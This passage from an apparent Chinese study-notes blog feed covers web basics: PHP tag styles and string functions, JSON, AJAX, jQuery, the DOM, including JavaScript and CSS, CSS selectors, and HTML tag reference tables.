title="客户端的输入"></a>客户端的输入</h4><p>argc 参数个数<br>argv 参数数组</p><h2 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h2><p>短标签是绕过防御的一种手段。<br>&lt;?php  这是完整标签<br>&lt;?     这是短标签<br>短标签的开启需要设置 php.ini将其中的short_open_tag=On<br>修改为Off</p><h3 id="php4种常见风格标签写法"><a href="#php4种常见风格标签写法" class="headerlink" title="php4种常见风格标签写法"></a>php4种常见风格标签写法</h3><h4 id="1、XML风格（默认开启）"><a href="#1、XML风格（默认开启）" class="headerlink" title="1、XML风格（默认开启）"></a>1、XML风格（默认开启）</h4><pre><code>    当php代码需要嵌入XML文件中    &lt;?php        代码    ?&gt;</code></pre><h4 id="2、短标签，如果要嵌入XML文档会干扰文档声明-默认禁止"><a href="#2、短标签，如果要嵌入XML文档会干扰文档声明-默认禁止" class="headerlink" title="2、短标签，如果要嵌入XML文档会干扰文档声明(默认禁止)"></a>2、短标签，如果要嵌入XML文档会干扰文档声明(默认禁止)</h4><pre><code>    &lt;?        代码    ?&gt;</code></pre><h4 id="3、asp-net习惯写法-默认禁止"><a href="#3、asp-net习惯写法-默认禁止" class="headerlink" title="3、asp.net习惯写法(默认禁止)"></a>3、asp.net习惯写法(默认禁止)</h4><pre><code>    &lt;%        代码    %&gt;</code></pre><h4 id="4、JS、VBscript等脚本程序风格-默认禁止"><a href="#4、JS、VBscript等脚本程序风格-默认禁止" class="headerlink" title="4、JS、VBscript等脚本程序风格(默认禁止)"></a>4、JS、VBscript等脚本程序风格(默认禁止)</h4><pre><code>    &lt;script language=&quot;php&quot;&gt;        代码    &lt;/script&gt;</code></pre><h1 id="php常用函数"><a href="#php常用函数" class="headerlink" title="php常用函数"></a>php常用函数</h1><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>addcslashes()</td><td>返回在指定的字符前添加反斜杆的字符串</td></tr><tr><td>addslashes()</td><td>返回在预定义的字符前添加反斜杠的字符串（防止sql注入的主要函数）</td></tr><tr><td>bin2hex()</td><td>把ASCII字符的字符串转换为十六进制值</td></tr><tr><td>chop()</td><td>一处字符串右侧的空白字符或其他字符</td></tr><tr><td>chr()</td><td>从指定ASCII值返回字符</td></tr><tr><td>chunk_split()</td><td>把字符串分割为一连串更小的部分</td></tr><tr><td>convert_uudecode()</td><td>对uuencode编码字符串进行解码</td></tr><tr><td>convert_uuencode()</td><td>使用uuencode算法对字符串进行编码</td></tr><tr><td>count_chars()</td><td>返回字符串所用字符的信息</td></tr><tr><td>crc32()</td><td>计算一个字符串的32位CRC</td></tr><tr><td>crypt()</td><td>单向的字符串加密法</td></tr><tr><td>echo()</td><td>输出一个或多个字符串</td></tr><tr><td>explode()</td><td>把字符打散为数组</td></tr><tr><td>fprintf()</td><td>把格式化的字符串写入到指定的输出流</td></tr><tr><td>hex2bin()</td><td>把十六进制值的字符串转换为ASCII字符串</td></tr><tr><td>htmlspecialchars()</td><td>把一些于定义的字符转换为HTML实体</td></tr><tr><td>implode()</td><td>返回一个由数组元素组合成的字符串</td></tr><tr><td>join()</td><td>implode()的别名</td></tr><tr><td>lcfirst()</td><td>把字符串中的首字符转换为小写</td></tr><tr><td>ltrim()</td><td>移出字符串左侧的空白字符或其他字符</td></tr><tr><td>md5()</td><td>计算字符串的MD5散列</td></tr><tr><td>md5_file()</td><td>计算文件的MD5散列</td></tr><tr><td>nl2br()</td><td>在字符串中的每一个新行之前插入HTML换行符</td></tr><tr><td>rtrim()</td><td>移出字符串右侧的空白字符或其他字符</td></tr><tr><td>sha1()</td><td>计算SHA-1散列</td></tr><tr><td>sha1_file()</td><td>计算文件的SHA-1散列</td></tr><tr><td>str_shuffle()</td><td>随机打乱字符串中的所有字符</td></tr><tr><td>str_split()</td><td>把字符串分割到数组中</td></tr><tr><td>str_word_count()</td><td>计算字符串中的单词</td></tr><tr><td>strcasecmp()</td><td>比较两个字符串（大小写不敏感）</td></tr><tr><td>strchr()</td><td>查找字符串在另一个字符串中的第一次出现</td></tr><tr><td>strcmp()</td><td>比较两个字符串（大小写敏感）</td></tr><tr><td>strcoll()</td><td>比较连个字符串(根据本地设置)</td></tr><tr><td>strcspn()</td><td>返回在找到指定的字符串之前，在字符串查找到的字符数</td></tr><tr><td>strip_tags()</td><td>剥去字符串中的HTML和PHP标签</td></tr><tr><td>stripcslashes()</td><td>删除由addcslashes()函数添加的反斜杠</td></tr><tr><td>stripslashes()</td><td>删除由addslashes()函数添加的反斜杠</td></tr><tr><td>strlen()</td><td>返回字符串的长度</td></tr><tr><td>strrev()</td><td>反转字符串</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三周 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSON</title>
      <link href="/2019/08/04/JSON/"/>
      <url>/2019/08/04/JSON/</url>
      
        <content type="html"><![CDATA[<h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><p>JSON文本格式在语法上与创建的JavaScript对象代码相同，可以用JSON数据来生成JavaScript对象<br>JSON是纯文本，可通过JavaScript进行解析，数据可使用AJAX进行传输。没有标签更短，读写速度更快，使用数组，不使用保留字</p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><pre><code>是JavaScript语法的子集    数据在名称/值对 中        值可以是：            数字(整数/浮点数)            字符串(在双引号中)            逻辑值(true或false)            数组（在[]）            对象（在{}）            null    数据由 ， 分割    {} 保存对象    [] 保存数组eg：&quot;firstName&quot;:&quot;John&quot;等价于firstName=&quot;John&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三周 </tag>
            
            <tag> JSON </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AJAX</title>
      <link href="/2019/08/04/AJAX/"/>
      <url>/2019/08/04/AJAX/</url>
      
        <content type="html"><![CDATA[<h1 id="AJAX-XHR创建对象"><a href="#AJAX-XHR创建对象" class="headerlink" title="AJAX XHR创建对象"></a>AJAX XHR创建对象</h1><p>XMLHttpRequest是AJAX的基础<br>XMLHttpRequest用于在后台与服务器交换数据，在不重新加载整个页面的情况下，对网页的某部分进行更新。</p><h2 id="XMLHttpRequest对象创建"><a href="#XMLHttpRequest对象创建" class="headerlink" title="XMLHttpRequest对象创建"></a>XMLHttpRequest对象创建</h2><pre><code>    eg： var=new XMLHttpRequest();</code></pre><h2 id="XMLHttpRequest对象用于和服务器交换数据"><a href="#XMLHttpRequest对象用于和服务器交换数据" class="headerlink" title="XMLHttpRequest对象用于和服务器交换数据"></a>XMLHttpRequest对象用于和服务器交换数据</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>open(method,url,async)</td><td>规定请求的类型、URL 以及是否异步处理请求。method：请求的类型；GET 或 POSTurl：文件在服务器上的位置async：true（异步）或 false（同步）</td></tr><tr><td>send(string)</td><td>将请求发送到服务器。string：仅用于 POST 请求</td></tr></tbody></table><h3 id="GET与POST"><a href="#GET与POST" class="headerlink" title="GET与POST"></a>GET与POST</h3><pre><code>GET更简单快速POST使用的前提：    1。无法使用缓存文件（更新服务器上的文件或数据库）    2。向服务器发送大量数据（POST没有数据量限制）    3。发送包含位字符的用户输入时，POST比GET更稳定可靠</code></pre><h2 id="服务器响应"><a href="#服务器响应" class="headerlink" title="服务器响应"></a>服务器响应</h2><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>responseText</td><td>获得字符串形式的响应数据。</td></tr><tr><td>responseXML</td><td>获得 XML 形式的响应数据。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三周 </tag>
            
            <tag> AJAX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jQuery</title>
      <link href="/2019/08/04/jQuery/"/>
      <url>/2019/08/04/jQuery/</url>
      
        <content type="html"><![CDATA[<h1 id="jQuery特性"><a href="#jQuery特性" class="headerlink" title="jQuery特性"></a>jQuery特性</h1><p>jQuery是一个JavaScript函数库，包含以下特性：<br>HTML元素选取、操作、CSS操作、HTML事件函数、JavaScript特效和动画、HTML DOM遍历和修改、AJAX</p><h1 id="jQuery库的引用"><a href="#jQuery库的引用" class="headerlink" title="jQuery库的引用"></a>jQuery库的引用</h1><pre><code>注意：&lt;script&gt; 标签应该位于页面的 &lt;head&gt; 部分    &lt;head&gt;        &lt;script type=&quot;text/javascript&quot; src=&quot;jquery.js&quot;&gt;&lt;/script&gt;    &lt;/head&gt;或者使用Google的CDN    &lt;head&gt;        &lt;script type=&quot;text/javascript&quot; src=&quot;http://ajax.googleapis.com/ajax/libs/jquery/1.4.0/jquery.min.js&quot;&gt;&lt;/script&gt;    &lt;/head&gt;Microsoft的CDN    &lt;head&gt;        &lt;script type=&quot;text/javascript&quot; src=&quot;http://ajax.microsoft.com/ajax/jquery/jquery-1.4.min.js&quot;&gt;&lt;/script&gt;    &lt;/head&gt;</code></pre><h1 id="jQuery语法"><a href="#jQuery语法" class="headerlink" title="jQuery语法"></a>jQuery语法</h1><p>可以对HTML某些元素执行操作</p><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><p>$(selector).action()<br>    $          定义jQuery<br>    (selector) 查询和查找HTML元素<br>    action()   执行对元素的操作</p><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><p>jQuery元素选择器和属性选择器允许通过标签名、属性名、或内容对HTML元素进行选择。选择器运行对HTML元素组或单个元素进行操作</p><h3 id="jQuery元素选择器"><a href="#jQuery元素选择器" class="headerlink" title="jQuery元素选择器"></a>jQuery元素选择器</h3><p>使用CSS选择器来选取HTML元素</p><pre><code>    $(&quot;p&quot;)选取的&lt;p&gt;元素    $(&quot;p.intro&quot;)选取所有class=&quot;intro&quot;的&lt;p&gt;元素    $(&quot;p#demo&quot;)选取所有id=&quot;demo&quot;的&lt;p&gt;元素</code></pre><h3 id="jQuery属性选择器"><a href="#jQuery属性选择器" class="headerlink" title="jQuery属性选择器"></a>jQuery属性选择器</h3><p>使用XPath表达式来选择带有给定属性的元素</p><pre><code>    $(&quot;[href]&quot;)选取所有带有href属性的元素    $(&quot;[href=&#39;#&#39;]&quot;)选取所有带有href值等于&quot;#&quot;的元素    $(&quot;[href！=&#39;#&#39;]&quot;)选取所有带有href值不等于&quot;#&quot;的元素    $(&quot;[href$=&#39;.jpg&#39;]&quot;)选取所有href值以&quot;.jpg&quot;结尾的元素</code></pre><h2 id="jQuery事件"><a href="#jQuery事件" class="headerlink" title="jQuery事件"></a>jQuery事件</h2><p>jQuery事件处理方法是jQuery中的核心函数。<br>最好把jQuery放置到独立的 .js文件爱女中</p><pre><code>eg：    &lt;head&gt;        &lt;script type=&quot;text/javascript&quot; src=&quot;jquery.js&quot;&gt;&lt;/script&gt;        &lt;script type=&quot;text/javascript&quot; src=&quot;my_jquery_functions.js&quot;&gt;&lt;/script&gt;    &lt;/head&gt;</code></pre><p>如果出现名称冲突，jQuery.noConflict()</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三周 </tag>
            
            <tag> jQuery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML DOM</title>
      <link href="/2019/08/04/HTML-DOM/"/>
      <url>/2019/08/04/HTML-DOM/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>DOM将XML文档作为一个树形结构，而树叶被定义为节点。<br><img src="/HTML-DOM/20190804063543124.png" alt></p><h2 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h2><p>DOM，XML文档中的每一个成分都是一个节点。<br>    1。整个文档是一个文档节点<br>    2。每个XML标签是一个元素节点<br>    3。包含在XML元素中的文本是文本节点<br>    4。每一个XML属性是一个属性节点<br>    5。注释属于注释节点<br>注意：元素节点的文本是存储在文本节点中的</p><h2 id="节点树"><a href="#节点树" class="headerlink" title="节点树"></a>节点树</h2><p>把XML DOM文档视为一棵节点树，树中所有节点彼此都有关系。</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三周 </tag>
            
            <tag> HTML DOM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript语言</title>
      <link href="/2019/08/04/JavaScript%E8%AF%AD%E8%A8%80/"/>
      <url>/2019/08/04/JavaScript%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript特点"><a href="#JavaScript特点" class="headerlink" title="JavaScript特点"></a>JavaScript特点</h1><p>设计相HTML页面交互，是一种轻量级的编程语言（脚本语言），由数行可执行计算机代码组成，通常直接嵌入到HTML页面，是一种解释性语言。<br>1。分离了HTML和代码<br>2。使HTML和JavaScript更易于维护<br>3。已缓存的JavaScript文件可加速页面的加载</p><h1 id="JavaScript引用方式（和CSS类似）"><a href="#JavaScript引用方式（和CSS类似）" class="headerlink" title="JavaScript引用方式（和CSS类似）"></a>JavaScript引用方式（和CSS类似）</h1><pre><code>在HTML中JavaScript代码必须位于&lt;script&gt;与&lt;/script&gt;标签之间</code></pre><h2 id="1、在head标签内引用"><a href="#1、在head标签内引用" class="headerlink" title="1、在head标签内引用"></a>1、在head标签内引用</h2><pre><code>eg：&lt;head&gt;    &lt;script &gt;        function MyFunction(){            document.getElementById(&quot;demo&quot;).innerHTML=&quot;段落更改&quot;        }    &lt;/script&gt;&lt;/head&gt;</code></pre><h2 id="2、在body标签内引用"><a href="#2、在body标签内引用" class="headerlink" title="2、在body标签内引用"></a>2、在body标签内引用</h2><pre><code>eg:&lt;body&gt;    &lt;script &gt;        function MyFunction(){            document.getElementById(&quot;demo&quot;).innerHTML=&quot;段落更改&quot;        }    &lt;/script&gt;&lt;/body&gt;</code></pre><h2 id="3、外部脚本"><a href="#3、外部脚本" class="headerlink" title="3、外部脚本"></a>3、外部脚本</h2><pre><code>eg：遵循相对路径或绝对路径    &lt;script  src=&quot;/Users/用户/Desktop/html/JS/shiyan.js&quot;&gt;&lt;/script&gt;    &lt;script type=&quot;text/javascript&quot; src=&quot;JS/shiyan.js&quot;&gt;&lt;/script&gt;</code></pre><h2 id="4、外部网页引用"><a href="#4、外部网页引用" class="headerlink" title="4、外部网页引用"></a>4、外部网页引用</h2><pre><code>eg：使用完整的url路径或相当于当前网页的路径引用外部脚本&lt;script src=&quot;https://www.w3school.com.cn/js/myScript1.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://www.w3school.com.cn/js/myScript1.js&quot;&gt;&lt;/script&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三周 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS语言</title>
      <link href="/2019/08/04/CSS%E8%AF%AD%E8%A8%80/"/>
      <url>/2019/08/04/CSS%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS的引入方法"><a href="#CSS的引入方法" class="headerlink" title="CSS的引入方法"></a>CSS的引入方法</h1><h2 id="1、内嵌式："><a href="#1、内嵌式：" class="headerlink" title="1、内嵌式："></a>1、内嵌式：</h2><pre><code>直接在&lt;head&gt;标签中完成CSS文件的引入</code></pre><pre><code>    &lt;style type=&quot;text/css&quot;&gt;        使用选择器控制HTML格式    &lt;/style&gt;</code></pre><h2 id="2、外链式："><a href="#2、外链式：" class="headerlink" title="2、外链式："></a>2、外链式：</h2><pre><code>通过引入&lt;link&gt;标签完成CSS文件的引入</code></pre><pre><code>    &lt;link rel=&quot;&quot; type=&quot;&quot; href=&quot;&quot;&gt;    rel：定义当前文档与被链接文档之间的关系    type：规定被链接文档的MIME类    href：引入CSS文件的位置两种写法        1。相对路径            a)    ./        代表文件的所在目录（可以省略）            b)    ../        代表文件的上级目录            c)    ../../        代表文件的上上级目录            d)    /        代表文件所在的根目录         2.绝对路径 完整的路径地址            文件从根目录开始查找，注意win的路径符号 \ 换成 /</code></pre><h2 id="3、行内式："><a href="#3、行内式：" class="headerlink" title="3、行内式："></a>3、行内式：</h2><p>直接在HTML元素标签内编写属性 使用 style</p><h2 id="4、导入式："><a href="#4、导入式：" class="headerlink" title="4、导入式："></a>4、导入式：</h2><p>通过 @import 导入外部样式，遵循相对路径或绝对路径</p><h3 id="四种导入方式的比较"><a href="#四种导入方式的比较" class="headerlink" title="四种导入方式的比较"></a>四种导入方式的比较</h3><table><thead><tr><th>导入方式</th><th>导入方法</th><th>CSS文件位置</th><th>CSS文件加载</th></tr></thead><tbody><tr><td>行内式</td><td>元素标签内 style</td><td>HTML文件内</td><td>同时</td></tr><tr><td>内嵌式</td><td>在head标签内使用 style标签</td><td>HTML文件内</td><td>同时</td></tr><tr><td>外链式</td><td>在head标签内使用 link标签</td><td>与HTML文件分离，在单独的文件内</td><td>页面加载时，同时加载CSS样式</td></tr><tr><td>导入式</td><td>在head标签内 使用style标签用 @import</td><td>与HTML文件分离，在单独的文件内</td><td>在读取完THML之后加载</td></tr></tbody></table><p>CSS样式执行的优先级是就近原则<br>一般是：行内式 &gt; 内嵌式 &gt; 外链式 &gt; 导入式</p><h1 id="CSS基础语法"><a href="#CSS基础语法" class="headerlink" title="CSS基础语法"></a>CSS基础语法</h1><p>CSS通过选择器对HTML元素进行控制。</p><blockquote><p>选择器的构成：</p><blockquote><p>选择器名 {声明1；声明2；…声明n；}</p><blockquote><p>声明是 属性：值</p><blockquote><p><strong>注释：</strong>声明使用花括号包围，值如果是若干单词使用引号括起。eg：p{font-family:”sans serif”;}<br>多个声明之间使用 ； 链接，建议使用代码的方式，一行写一个声明。虽然最后一个声明可以不加 ； 但是为了日后便于修改管理统一加上   ;</p></blockquote></blockquote></blockquote></blockquote><h1 id="CSS高级语法"><a href="#CSS高级语法" class="headerlink" title="CSS高级语法"></a>CSS高级语法</h1><h2 id="1、选择器分组"><a href="#1、选择器分组" class="headerlink" title="1、选择器分组"></a>1、选择器分组</h2><p>可以对不同种类的选择器进行分组，同组的选择器具有相同的属性，用 ， 进行分割</p><pre><code>eg:h1,h2,h3{   color:green;}</code></pre><h2 id="2、选择器继承"><a href="#2、选择器继承" class="headerlink" title="2、选择器继承"></a>2、选择器继承</h2><p>子元素从父元素继承属性，如果需要改变子元素的属性重新设置即可</p><h2 id="3、派生选择器"><a href="#3、派生选择器" class="headerlink" title="3、派生选择器"></a>3、派生选择器</h2><p>允许根据上下文的关系来确定某个标签的样式</p><pre><code>strong {     color: red;     }h2 {     color: yellow;     }h2 strong {     color: blue;     }只会影响&lt;p&gt;我是段落&lt;strong&gt;red&lt;/strong&gt;.&lt;/p&gt;&lt;h2&gt;我是标题1&lt;/h2&gt;&lt;h2&gt;我是标题2&lt;strong&gt;blue&lt;/strong&gt;.&lt;/h2&gt;</code></pre><p><img src="/CSS%E8%AF%AD%E8%A8%80/20190804050836249.png" alt></p><h2 id="4、后代选择器（包含选择器）"><a href="#4、后代选择器（包含选择器）" class="headerlink" title="4、后代选择器（包含选择器）"></a>4、后代选择器（包含选择器）</h2><p>定义后代选择器创建一些规则，使这些规则在某些文档结构中起作用，而在另外一些结构中不起作用。</p><pre><code>eg：只希望对h1元素中的em元素应用样式    h1 em{color:red;}    &lt;h1&gt;我是&lt;em&gt;重要&lt;/em&gt;标题&lt;/h1&gt;    &lt;p&gt;我是&lt;em&gt;重要&lt;/em&gt;段落&lt;/p&gt;</code></pre><p>效果：<br><img src="/CSS%E8%AF%AD%E8%A8%80/20190804051549999.png" alt></p><h2 id="5、子元素选择器（Child-selectors"><a href="#5、子元素选择器（Child-selectors" class="headerlink" title="5、子元素选择器（Child selectors)"></a>5、子元素选择器（Child selectors)</h2><p>如果不希望选择任意的后代元素，而是缩小范围，只选择某个元素的子元素。</p><pre><code>    eg:希望选择制作为h1元素子元素的strong元素    h1&gt;strong{color:red;}    会把第一个h1下面的两个strong元素改变颜色，但第二个h1不受影响    &lt;h1&gt;我是&lt;strong&gt;非常&lt;/strong&gt; &lt;strong&gt;非常&lt;/strong&gt; 重要的。&lt;/h1&gt;    &lt;h1&gt;我是&lt;em&gt;非常&lt;/em&gt; &lt;em&gt;非常&lt;/em&gt; 重要的。&lt;/h1&gt;</code></pre><p>效果图：<br><img src="/CSS%E8%AF%AD%E8%A8%80/20190804052325897.png" alt></p><h2 id="6、相邻兄弟选择器（Adjacent-sibling-selector）"><a href="#6、相邻兄弟选择器（Adjacent-sibling-selector）" class="headerlink" title="6、相邻兄弟选择器（Adjacent sibling selector）"></a>6、相邻兄弟选择器（Adjacent sibling selector）</h2><p>如果需要选择紧接在另一个元素后的元素，而且两者有相同的父元素。</p><pre><code>    eg：要增加紧接在h1元素后出现的段落的上边距    h1+p{margin-top:50px}    &lt;h1&gt;我是标题&lt;/h1&gt;    &lt;p&gt;我是段落&lt;/p&gt;    &lt;p&gt;我是段落&lt;/p&gt;    &lt;p&gt;我是段落&lt;/p&gt;</code></pre><p>效果图<br><img src="/CSS%E8%AF%AD%E8%A8%80/20190804052909219.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三周 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML和XML语言</title>
      <link href="/2019/08/04/HTML%E5%92%8CXML%E8%AF%AD%E8%A8%80/"/>
      <url>/2019/08/04/HTML%E5%92%8CXML%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h1><p>由&lt;关键词&gt;组成分开始标签&lt;关键词&gt;结束标签&lt;/关键词&gt;<br>标签分为开放标签（只有开始标签）、闭合标签（有开始和结束标签）</p><h1 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h1><p>元素指的是从开始标签到结束标签的所有代码。<br><strong>注释：</strong>开始标签（开放标签），结束标签（闭合标签）</p><h2 id="元素语法"><a href="#元素语法" class="headerlink" title="元素语法"></a>元素语法</h2><p>HTML元素以开始标签起，以结束标签止。元素内容是开始标签与结束标签之间的内容。空元素在开始标签中进行关闭（以开始标签的结束而结束）</p><h1 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h1><p>属性提供了关于HTML元素的功多信息。属性总是以 名称/值对 的形式出现 eg： name=”value”，属性总是在HTML元素的开始标签中定义。</p><hr><h1 id="HTML标签"><a href="#HTML标签" class="headerlink" title="HTML标签"></a>HTML标签</h1><h2 id="注释：因为MarkDown格式原因，标签内的-请无视"><a href="#注释：因为MarkDown格式原因，标签内的-请无视" class="headerlink" title="注释：因为MarkDown格式原因，标签内的 \ 请无视"></a><strong>注释：</strong>因为MarkDown格式原因，标签内的 \ 请无视</h2><h3 id="1、基础功能标签"><a href="#1、基础功能标签" class="headerlink" title="1、基础功能标签"></a>1、基础功能标签</h3><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td>&lt;!DOCTYPE&gt;</td><td>定义文档类型。</td></tr><tr><td>&lt;\html&gt;</td><td>定义 HTML 文档。</td></tr><tr><td>&lt;\title&gt;</td><td>定义文档的标题。</td></tr><tr><td>&lt;\body&gt;</td><td>定义文档的主体。</td></tr><tr><td>&lt;\h1&gt;to &lt;\h6&gt;</td><td>定义 HTML 标题。</td></tr><tr><td>&lt;\p&gt;</td><td>定义段落。</td></tr><tr><td>&lt;\br&gt;</td><td>定义简单的折行。</td></tr><tr><td>&lt;\hr&gt;</td><td>定义水平线。</td></tr><tr><td>&lt;!–…–&gt;</td><td>定义注释。</td></tr></tbody></table><h3 id="2、格式化标签"><a href="#2、格式化标签" class="headerlink" title="2、格式化标签"></a>2、格式化标签</h3><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td>&lt;\acronym&gt;</td><td>定义只取首字母的缩写。</td></tr><tr><td>&lt;\abbr&gt;</td><td>定义缩写。</td></tr><tr><td>&lt;\address&gt;</td><td>定义文档作者或拥有者的联系信息。</td></tr><tr><td>&lt;\b&gt;</td><td>定义粗体文本。</td></tr><tr><td>&lt;\bdi&gt;</td><td>定义文本的文本方向，使其脱离其周围文本的方向设置。</td></tr><tr><td>&lt;\bdo&gt;</td><td>定义文字方向。</td></tr><tr><td>&lt;\big&gt;</td><td>定义大号文本。</td></tr><tr><td>&lt;\blockquote&gt;</td><td>定义长的引用。</td></tr><tr><td>&lt;\center&gt;</td><td>不赞成使用。定义居中文本。</td></tr><tr><td>&lt;\cite&gt;</td><td>定义引用(citation)。</td></tr><tr><td>&lt;\code&gt;</td><td>定义计算机代码文本。</td></tr><tr><td>&lt;\del&gt;</td><td>定义被删除文本。</td></tr><tr><td>&lt;\dfn&gt;</td><td>定义定义项目。</td></tr><tr><td>&lt;\em&gt;</td><td>定义强调文本。</td></tr><tr><td>&lt;\font&gt;</td><td>不赞成使用。定义文本的字体、尺寸和颜色</td></tr><tr><td>&lt;\i&gt;</td><td>定义斜体文本。</td></tr><tr><td>&lt;\ins&gt;</td><td>定义被插入文本。</td></tr><tr><td>&lt;\kbd&gt;</td><td>定义键盘文本。</td></tr><tr><td>&lt;\mark&gt;</td><td>定义有记号的文本。</td></tr><tr><td>&lt;\meter&gt;</td><td>定义预定义范围内的度量。</td></tr><tr><td>&lt;\pre&gt;</td><td>定义预格式文本。</td></tr><tr><td>&lt;\progress&gt;</td><td>定义任何类型的任务的进度。</td></tr><tr><td>&lt;\q&gt;</td><td>定义短的引用。</td></tr><tr><td>&lt;\rp&gt;</td><td>定义若浏览器不支持 ruby 元素显示的内容。</td></tr><tr><td>&lt;\rt&gt;</td><td>定义 ruby 注释的解释。</td></tr><tr><td>&lt;\ruby&gt;</td><td>定义 ruby 注释。</td></tr><tr><td>&lt;\s&gt;</td><td>不赞成使用。定义加删除线的文本。</td></tr><tr><td>&lt;\samp&gt;</td><td>定义计算机代码样本。</td></tr><tr><td>&lt;\small&gt;</td><td>定义小号文本。</td></tr><tr><td>&lt;\strike&gt;</td><td>不赞成使用。定义加删除线文本。</td></tr><tr><td>&lt;\strong&gt;</td><td>定义语气更为强烈的强调文本。</td></tr><tr><td>&lt;\sup&gt;</td><td>定义上标文本。</td></tr><tr><td>&lt;\sub&gt;</td><td>定义下标文本。</td></tr><tr><td>&lt;\time&gt;</td><td>定义日期/时间。</td></tr><tr><td>&lt;\tt&gt;</td><td>定义打字机文本。</td></tr><tr><td>&lt;\u&gt;</td><td>不赞成使用。定义下划线文本。</td></tr><tr><td>&lt;\var&gt;</td><td>定义文本的变量部分。</td></tr><tr><td>&lt;\wbr&gt;</td><td>定义可能的换行符。</td></tr></tbody></table><h3 id="3、表单标签"><a href="#3、表单标签" class="headerlink" title="3、表单标签"></a>3、表单标签</h3><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td>&lt;\form&gt;</td><td>定义供用户输入的 HTML 表单。</td></tr><tr><td>&lt;\input&gt;</td><td>定义输入控件。</td></tr><tr><td>&lt;\textarea&gt;</td><td>定义多行的文本输入控件。</td></tr><tr><td>&lt;\button&gt;</td><td>定义按钮。</td></tr><tr><td>&lt;\select&gt;</td><td>定义选择列表（下拉列表）。</td></tr><tr><td>&lt;\optgroup&gt;</td><td>定义选择列表中相关选项的组合。</td></tr><tr><td>&lt;\option&gt;</td><td>定义选择列表中的选项。</td></tr><tr><td>&lt;\label&gt;</td><td>定义 input 元素的标注。</td></tr><tr><td>&lt;\fieldset&gt;</td><td>定义围绕表单中元素的边框。</td></tr><tr><td>&lt;\legend&gt;</td><td>定义 fieldset 元素的标题。</td></tr><tr><td>&lt;\isindex&gt;</td><td>不赞成使用。定义与文档相关的可搜索索引。</td></tr><tr><td>&lt;\datalist&gt;</td><td>定义下拉列表。</td></tr><tr><td>&lt;\keygen&gt;</td><td>定义生成密钥。</td></tr><tr><td>&lt;\output&gt;</td><td>定义输出的一些类型。</td></tr></tbody></table><h3 id="4、框架标签"><a href="#4、框架标签" class="headerlink" title="4、框架标签"></a>4、框架标签</h3><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td>&lt;\frame&gt;</td><td>定义框架集的窗口或框架。</td></tr><tr><td>&lt;\frameset&gt;</td><td>定义框架集。</td></tr><tr><td>&lt;\noframes&gt;</td><td>定义针对不支持框架的用户的替代内容。</td></tr><tr><td>&lt;\iframe&gt;</td><td>定义内联框架。</td></tr></tbody></table><h3 id="5、图象标签"><a href="#5、图象标签" class="headerlink" title="5、图象标签"></a>5、图象标签</h3><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td>&lt;\img&gt;</td><td>定义图像。</td></tr><tr><td>&lt;\map&gt;</td><td>定义图像映射。</td></tr><tr><td>&lt;\area&gt;</td><td>定义图像地图内部的区域。</td></tr><tr><td>&lt;\canvas&gt;</td><td>定义图形。</td></tr><tr><td>&lt;\figcaption&gt;</td><td>定义 figure 元素的标题。</td></tr><tr><td>&lt;\figure&gt;</td><td>定义媒介内容的分组，以及它们的标题。</td></tr></tbody></table><h3 id="6、音频-视频标签"><a href="#6、音频-视频标签" class="headerlink" 